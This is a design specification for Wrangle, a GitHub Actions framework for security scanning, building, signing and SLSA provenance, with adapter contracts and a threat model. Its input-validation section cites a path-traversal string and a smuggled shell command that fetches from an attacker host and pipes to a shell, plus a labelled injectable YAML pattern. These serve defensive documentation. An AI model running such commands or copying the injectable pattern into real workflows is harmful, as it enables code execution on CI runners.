# Wrangle v0.1 Specification

## Vision

Project maintainers should ship features securely without tracking security tooling details. Security engineers should update tools and best practices without bothering maintainers.

Wrangle is a composable CI/CD framework for GitHub Actions that handles the full software development lifecycle — not just security scanning, but also building, testing, publishing, and provenance — using best practices out of the box.

### Core principles

1. **Full lifecycle** — wrangle handles source scanning, building, testing, publishing, SBOM generation, signing, and SLSA provenance. Not just one stage.
2. **One-shot adoption** — a maintainer picks a profile matching their project type, gets one or two workflow files, and everything works
3. **Pluggable tools** — new tools are added via adapters without changing adopting repos
4. **Automatic updates** — adopters reference wrangle's reusable workflows; updates flow to everyone
5. **AI-agent friendly** — designed so "Claude, adopt wrangle for this repo" just works

---

## Full Lifecycle

Wrangle covers the entire path from source to published artifact. Each stage has a corresponding reusable workflow that adopters can use independently or together.

### Stages

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Source     │    │   Build     │    │   Publish    │    │   Verify    │
│             │    │             │    │             │    │             │
│ • Vuln scan │───▶│ • Compile   │───▶│ • Push to   │───▶│ • SLSA      │
│ • Workflow  │    │ • Generate  │    │   registry  │    │   provenance│
│   linting   │    │   SBOM      │    │ • Sign with │    │ • Policy    │
│ • Scorecard │    │ • Scan SBOM │    │   Cosign    │    │   check     │
│ • Run tests │    │             │    │             │    │ • VSA       │
│ • SLSA      │    │             │    │             │    │             │
│   source    │    │             │    │             │    │             │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
```

| Stage | What wrangle does | Reusable workflow | Status |
|-------|------------------|-------------------|--------|
| **Source** | Vulnerability scanning (OSV), workflow linting (Zizmor), supply chain scoring (Scorecard), run tests, SLSA source provenance | `check_source_change.yml` | v0.1 |
| **Build** | Compile/build the project, generate SBOM, scan SBOM for vulnerabilities | `build_and_publish_*.yml` | v0.1 (container), v0.2+ (others) |
| **Publish** | Push artifact to registry, sign with Cosign | `build_and_publish_*.yml` | v0.1 (container) |
| **Verify** | Generate SLSA L3 build provenance, verify attestations against policy (Ampel) | `build_and_publish_*.yml` / future | v0.1 (provenance), v0.2 (policy) |

### What adopters get today (container project example)

With two workflow files, a container project gets:

**Source workflow (`check_source_change.yml`):**
- Run project tests (detected automatically or configured) on every PR
- OSV vulnerability scanning on every PR and push
- Zizmor workflow security linting
- OSSF Scorecard supply chain assessment
- Results in GitHub Security tab via SARIF

**Build workflow (`build_and_publish_container.yml`):**
- Docker image built with Buildx (multi-platform capable, cached)
- SBOM generated automatically (SPDX format)
- SBOM scanned for vulnerabilities before publish
- Image pushed to container registry (ghcr.io)
- Image signed with Cosign (keyless, via Sigstore OIDC — the signature is tied to the GitHub Actions OIDC identity, so verifiers can confirm the image was built by a specific workflow in a specific repo, without managing signing keys)
- SLSA Level 3 provenance attestation via `slsa-github-generator`

This is the "batteries included" experience: the maintainer provides a Dockerfile and wrangle handles everything else.

### Build type extensibility

The `build/actions/` directory is the extensibility point for different project types:

| Build type | Directory | What it does | Status |
|-----------|-----------|-------------|--------|
| Shell | `build/actions/shell/` | Run shellcheck + tests (bats/shunit2), no publishable artifact | v0.1 (wrangle dogfoods this) |
| Container | `build/actions/container/` | Docker build, SBOM, sign, push | v0.1 (exists) |
| Python | `build/actions/python/` | Build wheel/sdist, generate SBOM, publish to PyPI | Future |
| npm | `build/actions/npm/` | Build, generate SBOM, publish to npm registry | Future |
| Go | `build/actions/go/` | Build binary, generate SBOM, publish to GitHub Releases | Future |
| Generic | `build/actions/generic/` | Run user-defined build command, generate SBOM | Future |

Each build type follows the same pattern:
1. Build the artifact
2. Generate an SBOM describing it
3. Scan the SBOM for vulnerabilities
4. Publish the artifact
5. Sign the artifact
6. Generate SLSA provenance

New build types can be added without changing the source scanning workflow or the adopter's existing setup.

### Test integration

Wrangle doesn't replace your test framework — it orchestrates it. Tests run in **two places**:

1. **Source stage (on every PR):** The source workflow detects and runs the project's test command. This gives fast feedback on PRs before any build or publish step. Tests here use the shell/script build type adapter for detection.
2. **Build stage (on merge/tag):** Tests run again as part of the build, ensuring the artifact being published passes all checks.

Test detection by project type:
- **Shell projects:** `bats` tests, `make test`, or shellcheck
- **Container projects:** Tests run during `docker build` (multi-stage builds) or as a pre-build step
- **Future build types:** `pytest`, `npm test`, `go test`, etc.

If tests fail at either stage, the pipeline stops. No artifact is built or published from untested code.

### Build stage failure contract

The build stage has multiple failure points with different behaviors:

| Failure | Behavior | Rationale |
|---------|----------|-----------|
| **Tests fail** | Pipeline stops. No artifact built or published. | Broken code should never be released. |
| **Build fails** | Pipeline stops. | Nothing to publish. |
| **SBOM generation fails** | Pipeline stops. | Can't verify what's in the artifact without an SBOM. |
| **SBOM vulnerability scan finds issues** | Build continues. SARIF uploaded to Security tab. Findings visible but non-blocking. | Vulnerabilities in dependencies are informational — maintainers need to see them but shouldn't be blocked from shipping. Blocking on transitive dependency vulns creates alert fatigue and is often unactionable. |
| **Cosign signing fails** | Pipeline stops. Unsigned artifact is NOT published. | An unsigned artifact missing an expected security guarantee is indistinguishable from a supply chain attack. Publishing it trains users to accept unsigned artifacts, which is exactly the condition an attacker needs. |
| **SLSA provenance generation fails** | Pipeline stops. Artifact is NOT published without provenance. | Same reasoning — if adopters expect provenance and it's suddenly missing, that's either an attack or a broken release. Either way, don't ship it. "Oh sure, USUALLY this has provenance, but there was a problem" is the social engineering vector for supply chain attacks. |

This "fail on anything that weakens security guarantees" approach is stricter than the typical "warn on infra" pattern, but wrangle is a security tool — its releases must model the behavior it advocates. If Sigstore/Fulcio is down, the correct response is to wait and retry, not to ship without signing.

## Architecture

### Layers

```
┌──────────────────────────────────────────────────┐
│  Adopting Repo                                   │
│  .github/workflows/check_source_change.yml       │
│  (calls wrangle's reusable workflow)             │
└──────────────────┬───────────────────────────────┘
                   │ uses:
┌──────────────────▼───────────────────────────────┐
│  Wrangle Reusable Workflow                       │
│  .github/workflows/check_source_change.yml       │
│  (orchestrates composite actions)                │
└──────────────────┬───────────────────────────────┘
                   │ uses:
┌──────────────────▼───────────────────────────────┐
│  Wrangle Composite Action                        │
│  actions/scan/action.yml                         │
│  (installs tools, runs adapters, uploads results)│
└──────────────────┬───────────────────────────────┘
                   │ calls
┌──────────────────▼───────────────────────────────┐
│  Orchestrator + Tools                            │
│  run.sh → tools/<name>/install.sh                │
│         → tools/<name>/adapter.sh                │
│  (download binaries, run tools, normalize output)│
└──────────────────────────────────────────────────┘
```

### Directory Layout

```
wrangle/
├── tools/                  # One directory per tool — everything in one place
│   ├── osv/
│   │   ├── install.sh      # Downloads + verifies OSV-Scanner binary
│   │   ├── adapter.sh      # Runs OSV-Scanner, produces SARIF
│   │   └── test.bats       # Tests for this tool
│   └── zizmor/
│       ├── install.sh
│       ├── adapter.sh
│       └── test.bats
├── lib/                    # Shared helpers
│   ├── download_verify.sh  # wrangle_download_verify(), wrangle_verify_provenance()
│   ├── format_sarif_summary.sh  # SARIF → markdown summary
│   └── sarif_to_text.sh    # SARIF → human-readable plain text
├── actions/                # GitHub Actions entry points
│   ├── scan/
│   │   └── action.yml      # Composite action: scan source code
│   └── scorecard/
│       └── action.yml      # OSSF Scorecard wrapper (GitHub Action, not adapter)
├── build/                  # Build/publish workflows
│   └── actions/
│       └── container/
│           └── action.yml  # Container build/publish action
├── run.sh                  # Orchestrator (installs + runs tools)
├── gh_workflow_examples/   # Copy-paste templates for adopters
├── test/                   # Integration tests, fixtures, schemas
├── docs/
│   └── SPEC.md             # This document
└── AGENTS.md               # AI agent adoption instructions
```

**Why per-tool directories?** Everything related to a single capability lives in one place. To understand "what does wrangle's OSV integration entail?" — look in `tools/osv/`. To add a new tool — copy any `tools/<name>/` directory and adapt. This makes the project easy to navigate and extend.

**Note on root layout:** `run.sh` and `AGENTS.md` live at the repo root for discoverability. If the repo grows and the root gets noisy, `run.sh` could move into a `src/` directory (updating the `../../` path constraint in the composite action accordingly).

**`build/actions/` extensibility:** The `build/actions/container/` directory is the first build type. Future build types (e.g., `build/actions/python/`, `build/actions/npm/`) follow the same pattern, providing opinionated build+publish workflows for different project types.

---

## Tool Adapter API

### Adapter Script Interface

Each tool directory contains an `adapter.sh` that wraps the tool with a standard interface.

**Contract:**

```
LOCATION: tools/<name>/adapter.sh

USAGE:  adapter.sh <src_dir> <output_dir>

ARGUMENTS:
  src_dir     Path to the source code to scan (read-only)
  output_dir  Path to write results (writable, already exists)

OUTPUT FILES (written to output_dir):
  output.sarif   REQUIRED  SARIF 2.1.0 JSON
  output.md      OPTIONAL  Human-readable markdown summary
  output.txt     OPTIONAL  Human-readable plain text (fallback if no .md)

EXIT CODES:
  0  Scan completed, no findings
  1  Scan completed, findings detected
  2  Scan failed (tool error)

PRECONDITIONS:
  Tool binary is on $PATH (handled by install script)
  jq is available

ENVIRONMENT:
  Adapters run with a restricted environment. Only the following variables
  are passed through from the runner:
    PATH, HOME, TMPDIR, RUNNER_TEMP, GITHUB_WORKSPACE, GITHUB_STEP_SUMMARY
  Sensitive variables (GITHUB_TOKEN, ACTIONS_RUNTIME_TOKEN, etc.) are NOT
  available to adapters by default. If a tool requires an additional
  environment variable (e.g., a private vulnerability DB token), it can
  be passed through by setting it in the composite action's `env:` block
  with a `WRANGLE_EXTRA_` prefix. The orchestrator forwards any variable
  matching `WRANGLE_EXTRA_*` to adapters with the prefix stripped.
  Example: `WRANGLE_EXTRA_OSV_DB_TOKEN=xxx` becomes `OSV_DB_TOKEN=xxx`
  in the adapter environment. This keeps the allowlist explicit without
  requiring adapter forks for authenticated tools.

SECURITY:
  - Adapter scripts MUST NOT write files outside of output_dir.
    The orchestrator performs a post-execution filesystem check to detect
    unexpected modifications outside output_dir and flags violations.
  - Adapter scripts MUST NOT make network requests beyond what the tool
    requires for its scan (e.g., fetching vulnerability databases)
  - All output written to GITHUB_STEP_SUMMARY MUST be sanitized to
    prevent markdown/HTML injection
  - jq exit codes MUST be checked; malformed SARIF must not silently pass
```

### Install Script Interface

Each tool directory contains an `install.sh` that downloads and verifies the tool binary. Install scripts are called by the orchestrator (`run.sh`), not by users directly.

**Contract:**

```
LOCATION: tools/<name>/install.sh

USAGE:  install.sh [version]

ARGUMENTS:
  version  Optional. Pinned version to install. Defaults to a known-good version
           hardcoded in the script.

BEHAVIOR:
  1. Check if correct version is already installed; exit 0 if so
  2. Detect OS (linux/darwin) and arch (amd64/arm64)
  3. Download binary over HTTPS from tool's official release page
  4. Verify integrity (see "Integrity Verification" below)
  5. Place binary in $WRANGLE_BIN_DIR (default: $RUNNER_TEMP/.wrangle/bin)
  6. Print installed version to stdout

EXIT CODES:
  0  Installed successfully (or already present)
  1  Installation failed (download error, checksum mismatch, etc.)

INTEGRITY VERIFICATION (mandatory):
  Every install script MUST verify the downloaded binary before placing it
  on PATH. Install scripts MUST use lib/download_verify.sh for this.
  The scan action installs slsa-verifier via the official
  slsa-framework/slsa-verifier/actions/installer action.

  Verification method (chosen per tool at development time, not at runtime):

    Each tool's install script uses exactly ONE verification method,
    chosen at development time based on what the upstream tool publishes.
    There is NO runtime fallback between methods. If the chosen method
    fails, the install MUST fail — a verification failure may indicate a
    supply chain attack, and falling back to a weaker method would defeat
    the purpose of the stronger one.

    The methods, in order of preference:
    1. SLSA provenance verification — if the tool publishes SLSA
       attestations, the install script verifies them via slsa-verifier.
       This proves the binary was built from specific source by a specific
       builder. Provenance verification is sufficient on its own — no
       additional checksum is needed because the provenance attestation
       covers the artifact's identity and integrity.
    2. Sigstore signature verification — if the tool signs releases with
       Cosign/Sigstore but does not publish full SLSA attestations, the
       install script verifies the signature. If signature verification
       fails, the install MUST abort.
    3. SHA-256 checksum — if neither SLSA provenance nor Sigstore
       signatures are available, verify against a checksum hardcoded in
       the install script itself (NOT downloaded alongside the binary).
       Each version bump requires updating the pinned checksum.

    CRITICAL: There is no fallback. A tool configured for SLSA provenance
    MUST NOT silently continue with only checksum verification if
    provenance verification fails. A failed verification of any kind is
    an error, not a reason to try something weaker.

  Tools with SLSA provenance: OSV-Scanner
  Tools with Sigstore signatures: (to be determined per tool)
  Tools with checksum only: Zizmor

  The download/verify flow:
    1. Download binary to a temporary file ($RUNNER_TEMP/wrangle-dl-XXXXX)
    2. Verify using the tool's configured method (provenance, signature,
       or checksum — exactly one)
    3. If verification fails: delete temp file, exit 1
    4. Atomically move (mv) to $WRANGLE_BIN_DIR/<tool>

INSTALL DIRECTORY:
  Binaries are installed to $WRANGLE_BIN_DIR, which defaults to
  $RUNNER_TEMP/.wrangle/bin. This directory:
  - Is wrangle-specific (no conflicts with system tools)
  - Is ephemeral on GitHub-hosted runners (cleaned up after the job)
  - Is prepended to $PATH by the composite action
  - MUST NOT be /usr/local/bin or other system directories

IDEMPOTENCY:
  Install scripts MUST be safe to run multiple times. On self-hosted runners
  where $RUNNER_TEMP persists, use atomic mv (not cp) to prevent TOCTOU
  races between the version check and binary placement.
```

### Orchestrator Interface

`run.sh` (at the repo root) installs and runs multiple adapters.

**Contract:**

```
USAGE:  run.sh [-s <src_dir>] [-o <output_dir>] <tool1> [tool2] ...

OPTIONS:
  -s src_dir     Source directory to scan (default: .)
  -o output_dir  Output directory for results (default: ./metadata)

ARGUMENTS:
  tool1, tool2   Tool specs to run (e.g., osv, zizmor, scorecard:info).
                 Optional :fail/:info suffix is stripped before processing.
                 Action-pattern tools (no adapter.sh) are silently skipped.

BEHAVIOR:
  For each tool:
    1. Strip :policy suffix if present (run.sh does not use the policy —
       that is handled by lib/check_results.sh in the scan action)
    2. Validate tool name matches ^[a-z][a-z0-9_-]*$ (reject otherwise)
    3. Verify tools/<tool>/ directory exists (reject if not — unknown tool)
    4. Skip if tools/<tool>/adapter.sh or tools/<tool>/install.sh missing
       (the tool is action-pattern, handled by uses: steps in the scan action)
    5. Run tools/<tool>/install.sh (timeout: 5 minutes)
    6. Create <output_dir>/<tool>/
    7. Run tools/<tool>/adapter.sh <src_dir> <output_dir>/<tool>/ (timeout: 10 minutes)
    8. Record pass/fail status

  After all tools:
    9. Print summary table to stdout

TIMEOUTS:
  Each adapter invocation is wrapped in `timeout(1)` to prevent a hung tool
  from consuming the entire GitHub Actions job timeout (default 6 hours).

  Default timeouts:
    - Install scripts: 5 minutes (sufficient for binary download + verify)
    - Adapter scripts: 10 minutes (sufficient for scanning large repos)

  A timeout expiration is treated as exit code 2 (tool failure). The
  orchestrator logs the timeout and continues to the next tool.

EXIT CODES:
  0  All tools passed with no findings
  1  At least one tool found issues
  2  At least one tool failed to run (includes invalid tool names)

INPUT VALIDATION:
  Tool names MUST match the regex ^[a-z][a-z0-9_-]*$. This prevents:
  - Path traversal (e.g., ../../etc/passwd)
  - Shell injection (e.g., foo;curl evil.com|sh)
  - Glob expansion and word splitting

  All variable expansions MUST be quoted ("$@", "$tool", "${output_dir}")
  throughout the orchestrator and adapter scripts.

ENVIRONMENT ISOLATION:
  The orchestrator clears sensitive environment variables before invoking
  adapters. See the adapter API ENVIRONMENT section for the allowlist.

NOTES:
  The orchestrator resolves adapter and install script paths relative to its
  own location (using $0 / BASH_SOURCE), not the caller's working directory.
  This is critical for portability when called via github.action_path.
```

---

## Composite Action Interface

The scan action (`actions/scan/action.yml`) is the primary entry point for GitHub Actions users.

```yaml
name: Wrangle Source Scan
description: Scan source code with wrangle security tools

inputs:
  tools:
    description: >
      Space-separated list of tools to run. Suffix with :info for
      informational-only (default policy: :fail).
    required: false
    default: "osv zizmor scorecard:info"

# No secrets required — tools are downloaded as public binaries
```

**Tool policy syntax:** Each tool in the `tools` input accepts an optional `:fail` or `:info` suffix. The default is `:fail` — findings from the tool cause a non-zero exit. `:info` means findings are noted in the summary but do not block the check. This is useful for tools like Scorecard that assess repo-level posture rather than per-change vulnerabilities. Adopters can override the default policy (e.g., `scorecard:fail` to enforce Scorecard scores).

The scan action parses the `tools` input to dispatch adapter-pattern tools (those with `tools/<name>/adapter.sh`) to the orchestrator (`run.sh`) and invokes action-pattern tools via their static `uses:` steps. The `lib/check_results.sh` script evaluates all tool SARIF against their policies.

**Behavior:**
1. Checks out the calling repo
2. Runs the orchestrator with adapter-pattern tools (e.g., OSV)
3. Runs action-pattern tools (Zizmor, Scorecard)
4. Generates a markdown summary in the GitHub Actions step summary (primary output)
5. Checks results — fails the check if any tool (except informational ones) found issues
6. Uploads SARIF to GitHub Code Scanning (optional bonus — may not be available on private repos)
7. Uploads all results as an artifact for debugging and future attestation

The **step summary is the primary output**. It works on all repos — private, no Advanced Security, etc. SARIF upload to the Security tab is additive. The **metadata directory** (`$GITHUB_WORKSPACE/.wrangle/metadata/`) is a complete catalog of which tools ran and what they found, enabling future signed attestations.

**Portability:** Shell script paths use `${{ github.action_path }}` for resolution relative to the composite action's own directory. Action-pattern tool steps use `./` paths (e.g., `uses: ./tools/zizmor`), which resolve to the same repo at the called ref — so when an adopter pins `@v0.1.0`, all internal actions resolve at that tag, and when wrangle's own CI runs on a PR branch, they resolve at the PR's code.

**Path constraint:** The composite action resolves the orchestrator via `${{ github.action_path }}/../../run.sh`, which means the scan action MUST remain at exactly `actions/scan/` (two directories below the repo root). This is a hard structural constraint — moving the action to a different depth breaks the relative path. If the directory layout changes, these paths must be updated in the same commit.

**Input safety:** The `tools` input is passed to the orchestrator via an environment variable, never via direct `${{ }}` interpolation in `run:` blocks. This prevents expression injection:

```yaml
# CORRECT — input passed via env var
env:
  WRANGLE_TOOLS: ${{ inputs.tools }}
run: ${{ github.action_path }}/../../run.sh $WRANGLE_TOOLS

# WRONG — direct interpolation enables injection
run: ${{ github.action_path }}/../../run.sh ${{ inputs.tools }}
```

Note: `$WRANGLE_TOOLS` is intentionally unquoted so it word-splits into multiple arguments. This is safe because the orchestrator validates each token against `^[a-z][a-z0-9_-]*$` before use, and the orchestrator runs `set -f` (disable globbing) before processing arguments. Defense in depth: even if a glob character survived the regex, it would not expand.

The scan action strips `:fail`/`:info` suffixes before passing tool names to the orchestrator. The full `tool:policy` list is passed to `lib/check_results.sh` for result evaluation.

---

## Reusable Workflow Interface

The reusable workflow (`.github/workflows/check_source_change.yml`) wraps the composite action for `workflow_call` consumers.

**Internal path resolution:** All `uses:` steps inside the reusable workflow use `./` paths (e.g., `uses: ./actions/scan`). When a caller invokes the workflow at a specific ref (e.g., `@v0.1.0`), GitHub fetches the workflow at that ref, and all `./` references resolve to the same repo at that ref. This means adopters automatically get version-locked internal actions matching their pinned tag, and wrangle's own PR CI tests the PR branch's code (not main).

```yaml
on:
  workflow_call:
    inputs:
      tools:
        description: "Space-separated list of tools to run (suffix :info for informational)"
        required: false
        type: string
        default: "osv zizmor scorecard:info"
# No secrets required
```

**Adopter workflow (what goes in the adopting repo):**

```yaml
name: Check Source Change
on:
  push:
    branches: ["main"]
  pull_request:
    branches: ["**"]

jobs:
  check-change:
    permissions:
      actions: read
      contents: read
      security-events: write
    uses: TomHennen/wrangle/.github/workflows/check_source_change.yml@v0.1.0
```

This is the entire file an adopter needs. No secrets, no configuration, no dependencies to manage.

---

## Supported Tools (v0.1)

| Tool | Pattern | What it does |
|------|---------|-------------|
| [OSV-Scanner](https://github.com/google/osv-scanner) | Adapter | Scans dependencies against the OSV database |
| [Zizmor](https://github.com/zizmorcore/zizmor) | Action (wraps `zizmorcore/zizmor-action`) | Security-focused linting of GitHub Actions workflows |
| [OSSF Scorecard](https://scorecard.dev/) | Action (wraps `ossf/scorecard-action`) | Assesses repo security health across 18+ categories |

### Two Tool Patterns

Every tool lives in `tools/<name>/` regardless of which pattern it uses. There are two patterns:

**Adapter pattern** — for tools distributed as standalone binaries (e.g., OSV-Scanner). The orchestrator (`run.sh`) handles installation and execution:

```
tools/<name>/
├── install.sh    # Downloads + verifies the tool binary
├── adapter.sh    # Runs the tool, produces SARIF
└── test.bats     # Tests for both scripts
```

**Action pattern** — for tools that have an official GitHub Action or are best installed via their ecosystem's package manager (e.g., Zizmor, Scorecard). A thin composite action wraps the upstream action:

```
tools/<name>/
├── action.yml    # Composite action wrapping the upstream action
└── test.bats     # Structural tests + CI integration tests
```

Use the action pattern when:
- The tool has a well-maintained official GitHub Action
- The tool's recommended installation method requires an ecosystem runtime (cargo, pip, etc.) that wrangle shouldn't depend on
- The tool requires the GitHub Actions context (repository metadata, API access) that the adapter pattern's environment isolation strips

Use the adapter pattern when:
- The tool publishes standalone release binaries as its primary distribution
- The tool can run without GitHub Actions context
- You want the strongest environment isolation (adapters run with stripped env vars)

### Supported Platforms (v0.1)

v0.1 targets **Linux x86_64** (Ubuntu) runners only. This is what GitHub-hosted `ubuntu-latest` provides and covers the vast majority of CI workloads.

The install scripts include OS/arch detection (`linux/darwin`, `amd64/arm64`) as forward-looking scaffolding, but macOS and ARM runners are not tested or guaranteed to work in v0.1. Platform support will expand based on demand.

### Adding a New Tool

**Adapter pattern** (standalone binary):

1. Create `tools/foo/` directory with:
   - `install.sh` — uses `lib/download_verify.sh` for download and verification
   - `adapter.sh` — follows the adapter contract above
   - `test.bats` — tests using mock binaries (fast, deterministic)
2. Add `foo` to the orchestrator's default tool list in `actions/scan/action.yml`

**Action pattern** (wraps upstream GitHub Action):

1. Create `tools/foo/` directory with:
   - `action.yml` — composite action that wraps the upstream action. Must pin the upstream action to a full commit SHA. Must write SARIF output to `$WRANGLE_METADATA_DIR/foo/output.sarif` (workspace-relative, set by the scan action via `$GITHUB_ENV`). Must also produce human-readable output as `output.txt` (via `lib/sarif_to_text.sh`) or `output.md` for the step summary details section.
   - `test.bats` — structural tests (action.yml exists, SHA pinned, etc.)
2. Add a `uses: ./tools/foo` step in `actions/scan/action.yml`

Everything for one tool lives in one directory. No Docker images, no registry management, no workflow changes for adopters.

### Tool Sub-specifications

Each tool's detailed specification lives in `tools/<name>/SPEC.md` alongside the code it describes. Summary:

| Tool | Pattern | Default policy | Details |
|------|---------|---------------|---------|
| OSV-Scanner | Adapter | `:fail` | [`tools/osv/SPEC.md`](../tools/osv/SPEC.md) |
| Zizmor | Action | `:fail` | [`tools/zizmor/SPEC.md`](../tools/zizmor/SPEC.md) |
| OSSF Scorecard | Action | `:info` | [`tools/scorecard/SPEC.md`](../tools/scorecard/SPEC.md) |

### Metadata Directory

The metadata directory (`$GITHUB_WORKSPACE/.wrangle/metadata/`) is workspace-relative. This is required because Scorecard's Docker container only mounts `$GITHUB_WORKSPACE`, not `$RUNNER_TEMP`. The directory is set via `$GITHUB_ENV` as `WRANGLE_METADATA_DIR` and is available to all steps in the job.

Structure after a scan:
```
.wrangle/metadata/
├── osv/
│   └── output.sarif
├── zizmor/
│   ├── output.sarif
│   └── output.txt
└── scorecard/
    ├── output.sarif
    └── output.md
```

The `.wrangle/` directory is in `.gitignore` to prevent accidental commits. The orchestrator's filesystem check (`run.sh`) excludes the metadata directory from its pre/post snapshots.

**Future use:** The metadata directory is designed to become the source for signed attestations: "this commit was scanned by tools X, Y, Z with these results."

---

## Design Decisions

### Binary downloads over Docker images

**Previous approach:** Tools were wrapped in Docker images, pushed to ghcr.io, and run via `docker run` with volume mounts.

**New approach:** Tools are downloaded as standalone binaries and run directly.

**Rationale:**
- **Speed:** No image pull latency (cached binary downloads are near-instant)
- **Simplicity:** No container registry to manage, no image build pipeline
- **Portability:** Works on any runner (macOS, self-hosted, ARM — not just Linux with Docker)
- **Testability:** No Docker-in-Docker complexity; scripts testable with bats-core locally
- **Adoption friction:** No authentication needed to pull tool images

The container *build/publish* workflow (for building adopters' Docker images) remains unchanged.

### Reusable workflow + composite action (two layers)

The reusable workflow exists so adopters get a clean `uses:` interface with `workflow_call`. The composite action exists so the implementation can use `${{ github.action_path }}` for path resolution. GitHub requires this split because reusable workflows cannot use `github.action_path`.

### SARIF as the universal output format

All tools produce SARIF 2.1.0. This enables:
- Upload to GitHub Code Scanning (appears in Security tab)
- Consistent programmatic processing across tools
- A single summary formatter for all tools

Human-readable output (markdown/text) is optional and used only for step summaries.

### Per-tool SARIF uploads (not merged)

Each tool's SARIF file is uploaded to GitHub Code Scanning separately via `github/codeql-action/upload-sarif` with a per-tool `category` (e.g., `wrangle/osv`, `wrangle/zizmor`). This means:
- Each tool appears as a separate check run in the Security tab
- Findings are attributed to the specific tool that found them
- A noisy tool can be identified and tuned without affecting others

The alternative (merging all SARIF into one file) was rejected because it loses tool attribution and makes it harder to diagnose which tool produced which finding.

---

## Security Model

### Threat Model

Wrangle runs security tools on behalf of adopting repositories. This makes it a high-value target — a compromised wrangle could affect every adopter. The primary threats are:

1. **Compromised upstream tool release** — a malicious binary is published to a tool's GitHub releases page
2. **Compromised wrangle itself** — an attacker gains commit access to the wrangle repo
3. **Malicious adapter inputs** — attacker-controlled data flows into shell commands
4. **Tool misbehavior** — a tool writes outside its output directory, exfiltrates data, or produces malicious SARIF

### Integrity Verification

All downloaded binaries are verified before execution:

| Layer | Mechanism | Status |
|-------|-----------|--------|
| Transport | HTTPS only | Always required |
| Content | SHA-256 checksum (pinned in install script) | Always required (baseline integrity) |
| Provenance | SLSA attestation via slsa-verifier | Required for tools that publish it; failure = hard stop |
| Signature | Sigstore/Cosign signature verification | Required for tools that publish it; failure = hard stop |

Checksums are hardcoded in each install script, not downloaded from the same source as the binary. Updating a tool version requires updating the checksum in the same commit.

**No fallback between verification methods.** Each tool's verification method is chosen at development time. If provenance verification fails for a tool configured to use it, the install MUST fail — even if the checksum passed. A verification failure may indicate a supply chain attack; silently downgrading to a weaker method would mask the attack.

**Version upgrade workflow:** To update a tool version, run `make update-tool TOOL=osv VERSION=x.y.z`. This helper downloads the new binary, computes its SHA-256 checksum, and patches the install script. The contributor then verifies the change, commits both the version and checksum update together, and opens a PR. Dependabot is not used for tool binaries because it cannot update hardcoded checksums.

### Shared Download/Verify Library

`lib/download_verify.sh` provides helper functions used by all install scripts:

```bash
# Download a file and verify its SHA-256 checksum
# Usage: wrangle_download_verify <url> <expected_sha256> <output_path>
# Retries up to 3 times with exponential backoff (1s, 2s, 4s) on transient
# download failures (CDN blips, rate limits, DNS hiccups).
# Exits 1 on checksum mismatch or exhausted retries (temp file is deleted).
wrangle_download_verify() { ... }

# Verify SLSA provenance for a downloaded artifact
# Usage: wrangle_verify_provenance <artifact_path> <source_repo> <expected_tag>
# Exits 0 on success, 1 on failure (including tool not available)
# IMPORTANT: Returns 1 if slsa-verifier is not installed. Callers
# MUST NOT fall back to weaker verification on failure.
wrangle_verify_provenance() { ... }

# Verify Sigstore signature for a downloaded artifact
# Usage: wrangle_verify_signature <artifact_path> <expected_identity> <expected_issuer>
# Exits 0 on success, 1 on failure (including tool not available)
# IMPORTANT: Returns 1 if cosign is not installed. Callers
# MUST NOT fall back to weaker verification on failure.
wrangle_verify_signature() { ... }
```

All install scripts MUST use `wrangle_download_verify` rather than implementing their own download logic. This ensures consistent integrity verification and makes security fixes apply everywhere.

### SARIF to Human-Readable Text

`lib/sarif_to_text.sh` converts SARIF 2.1.0 to human-readable plain text. It is used by action-pattern tools to produce `output.txt` for the step summary details section.

```
# Usage: sarif_to_text.sh <sarif_file>
# Output format (one block per finding):
#   [HIGH] rule-id — file.yml:39
#     Message text
#
# Exit codes:
#   0  Success (including no findings)
#   1  Missing argument or file
#   2  Invalid JSON or malformed SARIF
```

Action-pattern tools call this script after producing SARIF to generate `output.txt`. The `format_sarif_summary.sh` script picks up `output.txt` (or `output.md`) to populate the expandable details section in the step summary.

### Sandboxing and Isolation

**What's enforced:**
- Tool names are validated against `^[a-z][a-z0-9_-]*$`
- Sensitive environment variables are stripped before adapter execution
- All shell variable expansions are quoted to prevent injection
- Inputs are passed via environment variables, not `${{ }}` interpolation

**What's NOT enforced (known limitations):**
- Adapters run directly on the runner with no filesystem isolation. A malicious tool binary could read/write anywhere the runner user can. The previous Docker-based design provided container isolation; the binary-download approach trades this for speed and simplicity.
- No egress restrictions on tool network access. A compromised tool could exfiltrate source code.
- No runtime monitoring of tool behavior (process spawning, file access).

**Mitigations for known limitations:**
- Integrity verification (checksums + SLSA provenance) is the primary defense against malicious binaries
- GitHub-hosted runners are ephemeral, limiting the blast radius of any compromise
- For self-hosted runners, adopters should use [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) alongside wrangle for network monitoring
- Post-execution filesystem check: the orchestrator snapshots the workspace file list before and after each adapter run, flagging any unexpected file modifications outside `output_dir`
- Future versions may use lightweight sandboxing (bubblewrap, firejail) on Linux runners

### Protecting Wrangle Itself

Wrangle is a supply chain amplifier — a compromise of wrangle propagates to every adopter. Protections for the wrangle repo itself:

- **[SLSA Source Track](https://slsa.dev/spec/v1.2/):** Wrangle adopts the SLSA source track via [slsa-framework/source-tool](https://github.com/slsa-framework/source-tool) to enforce branch protection, generate source provenance attestations, and establish a verifiable chain of trust for its own source code. This protects against threat #2 (compromised wrangle).
- **Action reference pinning:** All third-party actions pinned to full commit SHAs (protects against upstream action compromise).
- **Signed commits:** All commits to the wrangle repo should be signed.
- **Minimal permissions:** Wrangle's own workflows request only the permissions they need.
- **Dependency management:** Dependabot for GitHub Actions dependencies; `make update-tool` for tool binary versions.
- **SLSA build provenance (v0.2):** When wrangle produces releasable artifacts (e.g., if it ships a CLI or pre-built actions), those artifacts should have SLSA L3 build provenance via `slsa-github-generator`, the same standard wrangle helps adopters achieve.
- **Delayed dependency updates:** Wrangle does not auto-merge dependency updates immediately. New versions of upstream tools are adopted only after a delay (e.g., 7 days) to allow the community to discover supply chain attacks before wrangle amplifies them to all adopters. This follows the [OpenSSF Concise Guide for Evaluating Open Source Software](https://best.openssf.org/Concise-Guide-for-Evaluating-Open-Source-Software) principle of not being the first to adopt a new release.

### Action Reference Pinning

All `uses:` references in wrangle's own workflows and examples MUST be pinned:

| Reference type | Pinning requirement |
|---------------|---------------------|
| Third-party actions | Full commit SHA |
| Wrangle's own actions (in examples) | Release tag (e.g., `@v0.1.0`) |
